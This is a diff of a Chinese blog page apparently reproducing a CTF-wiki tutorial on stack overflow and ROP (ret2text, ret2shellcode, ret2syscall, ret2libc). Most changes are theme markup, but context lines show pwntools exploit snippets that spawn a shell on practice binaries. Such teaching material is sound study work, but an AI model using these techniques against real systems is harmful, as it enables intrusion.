@@ -1,179 +1,169 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Stack_based_overflow | alazymechnaic</title><meta name="author" content="alazymechnaic"><meta name="copyright" content="alazymechnaic"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序">
-<meta property="og:type" content="article">
-<meta property="og:title" content="Stack_based_overflow">
-<meta property="og:url" content="https://alazymechnaic.github.io/2023/04/26/stack-based-overflow/index.html">
-<meta property="og:site_name" content="alazymechnaic">
-<meta property="og:description" content="随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg">
-<meta property="article:published_time" content="2023-04-26T03:17:43.000Z">
-<meta property="article:modified_time" content="2023-08-24T01:15:03.039Z">
-<meta property="article:author" content="alazymechnaic">
-<meta property="article:tag" content="pwn">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://alazymechnaic.github.io/2023/04/26/stack-based-overflow/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
-  root: '/',
-  algolia: undefined,
-  localSearch: undefined,
-  translate: undefined,
-  noticeOutdate: undefined,
-  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
-  copy: {
-    success: '复制成功',
-    error: '复制错误',
-    noSupport: '浏览器不支持'
-  },
-  relativeDate: {
-    homepage: false,
-    post: false
-  },
-  runtime: '',
-  dateSuffix: {
-    just: '刚刚',
-    min: '分钟前',
-    hour: '小时前',
-    day: '天前',
-    month: '个月前'
-  },
-  copyright: undefined,
-  lightbox: 'fancybox',
-  Snackbar: undefined,
-  source: {
-    justifiedGallery: {
-      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
-      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
-    }
-  },
-  isPhotoFigcaption: false,
-  islazyload: false,
-  isAnchor: false,
-  percent: {
-    toc: true,
-    rightside: false,
-  }
-}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
-  title: 'Stack_based_overflow',
-  isPost: true,
-  isHome: false,
-  isHighlightShrink: false,
-  isToc: true,
-  postUpdate: '2023-08-24 09:15:03'
-}</script><noscript><style type="text/css">
-  #nav {
-    opacity: 1
-  }
-  .justified-gallery img {
-    opacity: 1
-  }
 
-  #recent-posts time,
-  #post-meta time {
-    display: inline !important
-  }
-</style></noscript><script>(win=>{
-    win.saveToLocal = {
-      set: function setWithExpiry(key, value, ttl) {
-        if (ttl === 0) return
-        const now = new Date()
-        const expiryDay = ttl * 86400000
-        const item = {
-          value: value,
-          expiry: now.getTime() + expiryDay,
-        }
-        localStorage.setItem(key, JSON.stringify(item))
-      },
 
-      get: function getWithExpiry(key) {
-        const itemStr = localStorage.getItem(key)
 
-        if (!itemStr) {
-          return undefined
-        }
-        const item = JSON.parse(itemStr)
-        const now = new Date()
 
-        if (now.getTime() > item.expiry) {
-          localStorage.removeItem(key)
-          return undefined
-        }
-        return item.value
-      }
-    }
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="alazymachine" href="https://alazymechnaic.github.io/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="alazymachine" href="https://alazymechnaic.github.io/atom.xml" />
+<link rel="alternate" type="application/json" title="alazymachine" href="https://alazymechnaic.github.io/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
   
-    win.getScript = url => new Promise((resolve, reject) => {
-      const script = document.createElement('script')
-      script.src = url
-      script.async = true
-      script.onerror = reject
-      script.onload = script.onreadystatechange = function() {
-        const loadState = this.readyState
-        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
-        script.onload = script.onreadystatechange = null
-        resolve()
-      }
-      document.head.appendChild(script)
-    })
-  
-    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
-      const link = document.createElement('link')
-      link.rel = 'stylesheet'
-      link.href = url
-      if (id) link.id = id
-      link.onerror = reject
-      link.onload = link.onreadystatechange = function() {
-        const loadState = this.readyState
-        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
-        link.onload = link.onreadystatechange = null
-        resolve()
-      }
-      document.head.appendChild(link)
-    })
-  
-      win.activateDarkMode = function () {
-        document.documentElement.setAttribute('data-theme', 'dark')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
-        }
-      }
-      win.activateLightMode = function () {
-        document.documentElement.setAttribute('data-theme', 'light')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
-        }
-      }
-      const t = saveToLocal.get('theme')
-    
-          if (t === 'dark') activateDarkMode()
-          else if (t === 'light') activateLightMode()
-        
-      const asideStatus = saveToLocal.get('aside-status')
-      if (asideStatus !== undefined) {
-        if (asideStatus === 'hide') {
-          document.documentElement.classList.add('hide-aside')
-        } else {
-          document.documentElement.classList.remove('hide-aside')
-        }
-      }
-    
-    const detectApple = () => {
-      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
-        document.documentElement.classList.add('apple')
-      }
-    }
-    detectApple()
-    })(window)</script><meta name="generator" content="Hexo 6.3.0">
+  <meta name="keywords" content="pwn" />
+
+
+<link rel="canonical" href="https://alazymechnaic.github.io/2023/04/26/stack-based-overflow/">
+
+
+
+  <title>
+Stack_based_overflow |
+Alazymachine = alazymachine = Alazymachine&PersonalBlog</title>
+<meta name="generator" content="Hexo 6.3.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
-</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://avatars.githubusercontent.com/u/36987782?v=4" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">12</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="alazymechnaic"><span class="site-name">alazymechnaic</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Stack_based_overflow</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-04-26T03:17:43.000Z" title="发表于 2023-04-26 11:17:43">2023-04-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-08-24T01:15:03.039Z" title="更新于 2023-08-24 09:15:03">2023-08-24</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">4.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>17分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Stack_based_overflow"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong>所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>
+</head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">Stack_based_overflow
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2023-04-26 11:17:43">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2023-04-26T11:17:43+08:00">2023-04-26</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">Alazymachine</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicli3sbvtj20zk0m8x6p.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipet8c1a2j20zk0m8kct.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipewr8iypj20zk0m8b29.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicliierfjj20zk0m8npd.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipeu1usa7j20zk0m8b29.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipewf5l51j20zk0m8b29.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="https://alazymechnaic.github.io/2023/04/26/stack-based-overflow/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/myavatar.jpg">
+    <meta itemprop="name" content="alazymachine">
+    <meta itemprop="description" content="Alazymachine&PersonalBlog, ">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="alazymachine">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong>所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>
 <p>之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件</p>
 <ul>
 <li>程序存在溢出，并且可以控制返回地址。</li>
 <li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</li>
 </ul>
 <p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。</p>
-<h2 id="ret2text¶"><a href="#ret2text¶" class="headerlink" title="ret2text¶"></a>ret2text<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2text">¶</a></h2><h3 id="原理-¶"><a href="#原理-¶" class="headerlink" title="原理 ¶"></a>原理 <a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_1">¶</a></h3><p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p>
+<h2 id="ret2text¶"><a href="#ret2text¶" class="headerlink" title="ret2text¶"></a>ret2text<span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI3JldDJ0ZXh0">¶</span></h2><h3 id="原理-¶"><a href="#原理-¶" class="headerlink" title="原理 ¶"></a>原理 <span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI18x">¶</span></h3><p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p>
 <p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p>
-<h3 id="例子-¶"><a href="#例子-¶" class="headerlink" title="例子 ¶"></a>例子 <a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_2">¶</a></h3><p>其实，在栈溢出的基本原理中，我们已经介绍了这一简单的攻击。在这里，我们再给出另外一个例子，bamboofox 中介绍 ROP 时使用的 ret2text 的例子。</p>
-<p>点击下载: <a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">ret2text</a></p>
+<h3 id="例子-¶"><a href="#例子-¶" class="headerlink" title="例子 ¶"></a>例子 <span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI18y">¶</span></h3><p>其实，在栈溢出的基本原理中，我们已经介绍了这一简单的攻击。在这里，我们再给出另外一个例子，bamboofox 中介绍 ROP 时使用的 ret2text 的例子。</p>
+<p>点击下载: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2N0Zi13aWtpL2N0Zi1jaGFsbGVuZ2VzL3Jhdy9tYXN0ZXIvcHduL3N0YWNrb3ZlcmZsb3cvcmV0MnRleHQvYmFtYm9vZm94LXJldDJ0ZXh0L3JldDJ0ZXh0">ret2text</span></p>
 <p>首先，查看一下程序的保护机制</p>
 <pre class="line-numbers language-none"><code class="language-none">➜  ret2text checksec ret2text
     Arch:     i386-32-little
@@ -260,10 +250,10 @@ target = 0x804863a
 sh.sendline('A' * (0x6c+4) + p32(target))
 sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="ret2shellcode¶"><a href="#ret2shellcode¶" class="headerlink" title="ret2shellcode¶"></a>ret2shellcode<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2shellcode">¶</a></h2><h3 id="原理-¶-1"><a href="#原理-¶-1" class="headerlink" title="原理 ¶"></a>原理 <a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_3">¶</a></h3><p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。<strong>一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码</strong>。</p>
+<h2 id="ret2shellcode¶"><a href="#ret2shellcode¶" class="headerlink" title="ret2shellcode¶"></a>ret2shellcode<span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI3JldDJzaGVsbGNvZGU=">¶</span></h2><h3 id="原理-¶-1"><a href="#原理-¶-1" class="headerlink" title="原理 ¶"></a>原理 <span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI18z">¶</span></h3><p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。<strong>一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码</strong>。</p>
 <p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p>
-<h3 id="例子-¶-1"><a href="#例子-¶-1" class="headerlink" title="例子 ¶"></a>例子 <a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_4">¶</a></h3><p>这里我们以 bamboofox 中的 ret2shellcode 为例</p>
-<p>点击下载: <a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">ret2shellcode</a></p>
+<h3 id="例子-¶-1"><a href="#例子-¶-1" class="headerlink" title="例子 ¶"></a>例子 <span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI180">¶</span></h3><p>这里我们以 bamboofox 中的 ret2shellcode 为例</p>
+<p>点击下载: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2N0Zi13aWtpL2N0Zi1jaGFsbGVuZ2VzL3Jhdy9tYXN0ZXIvcHduL3N0YWNrb3ZlcmZsb3cvcmV0MnNoZWxsY29kZS9yZXQyc2hlbGxjb2RlLWV4YW1wbGUvcmV0MnNoZWxsY29kZQ==">ret2shellcode</span></p>
 <p>首先检测程序开启的保护</p>
 <pre class="line-numbers language-none"><code class="language-none">➜  ret2shellcode checksec ret2shellcode
     Arch:     i386-32-little
@@ -342,12 +332,12 @@ buf2_addr = 0x804a080
 sh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr))
 sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="题目-¶"><a href="#题目-¶" class="headerlink" title="题目 ¶"></a>题目 <a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_5">¶</a></h3><ul>
+<h3 id="题目-¶"><a href="#题目-¶" class="headerlink" title="题目 ¶"></a>题目 <span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI181">¶</span></h3><ul>
 <li>sniperoj-pwn100-shellcode-x86-64</li>
 </ul>
-<h2 id="ret2syscall¶"><a href="#ret2syscall¶" class="headerlink" title="ret2syscall¶"></a>ret2syscall<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2syscall">¶</a></h2><h3 id="原理-¶-2"><a href="#原理-¶-2" class="headerlink" title="原理 ¶"></a>原理 <a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_6">¶</a></h3><p>ret2syscall，即控制程序执行系统调用，获取 shell。</p>
-<h3 id="例子-¶-2"><a href="#例子-¶-2" class="headerlink" title="例子 ¶"></a>例子 <a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_7">¶</a></h3><p>这里我们以 bamboofox 中的 ret2syscall 为例</p>
-<p>点击下载: <a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop">ret2syscall</a></p>
+<h2 id="ret2syscall¶"><a href="#ret2syscall¶" class="headerlink" title="ret2syscall¶"></a>ret2syscall<span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI3JldDJzeXNjYWxs">¶</span></h2><h3 id="原理-¶-2"><a href="#原理-¶-2" class="headerlink" title="原理 ¶"></a>原理 <span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI182">¶</span></h3><p>ret2syscall，即控制程序执行系统调用，获取 shell。</p>
+<h3 id="例子-¶-2"><a href="#例子-¶-2" class="headerlink" title="例子 ¶"></a>例子 <span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9iYXNpYy1yb3AvI183">¶</span></h3><p>这里我们以 bamboofox 中的 ret2syscall 为例</p>
+<p>点击下载: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2N0Zi13aWtpL2N0Zi1jaGFsbGVuZ2VzL3Jhdy9tYXN0ZXIvcHduL3N0YWNrb3ZlcmZsb3cvcmV0MnN5c2NhbGwvYmFtYm9vZm94LXJldDJzeXNjYWxsL3JvcA==">ret2syscall</span></p>
 <p>首先检测程序开启的保护</p>
 <pre class="line-numbers language-none"><code class="language-none">➜  ret2syscall checksec rop
     Arch:     i386-32-little
@@ -371,7 +361,7 @@ sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span>
 
 <p>可以看出此次仍然是一个栈溢出。类似于之前的做法，我们可以获得 v4 相对于 ebp 的偏移为 108。所以我们需要覆盖的返回地址相对于 v4 的偏移为 112。此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。关于系统调用的知识，请参考</p>
 <ul>
-<li><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8">https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8</a></li>
+<li><span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU3JUIzJUJCJUU3JUJCJTlGJUU4JUIwJTgzJUU3JTk0JUE4">https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8</span></li>
 </ul>
 <p>简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell</p>
 <pre class="line-numbers language-none"><code class="language-none">execve("/bin/sh",NULL,NULL)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -460,10 +450,10 @@ payload = flat(
 sh.sendline(payload)
 sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="题目-¶-1"><a href="#题目-¶-1" class="headerlink" title="题目 ¶"></a>题目 <a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_8">¶</a></h3><h2 id="ret2libc¶"><a href="#ret2libc¶" class="headerlink" title="ret2libc¶"></a>ret2libc<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2libc">¶</a></h2><h3 id="原理-¶-3"><a href="#原理-¶-3" class="headerlink" title="原理 ¶"></a>原理 <a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_9">¶</a></h3><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p>
-<h3 id="例子-¶-3"><a href="#例子-¶-3" class="headerlink" title="例子 ¶"></a>例子 <a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_10">¶</a></h3><p>我们由简单到难分别给出三个例子。</p>
-<h4 id="例-1¶"><a href="#例-1¶" class="headerlink" title="例 1¶"></a>例 1<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#1">¶</a></h4><p>这里我们以 bamboofox 中 ret2libc1 为例</p>
-<p>点击下载: <a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1">ret2libc1</a></p>
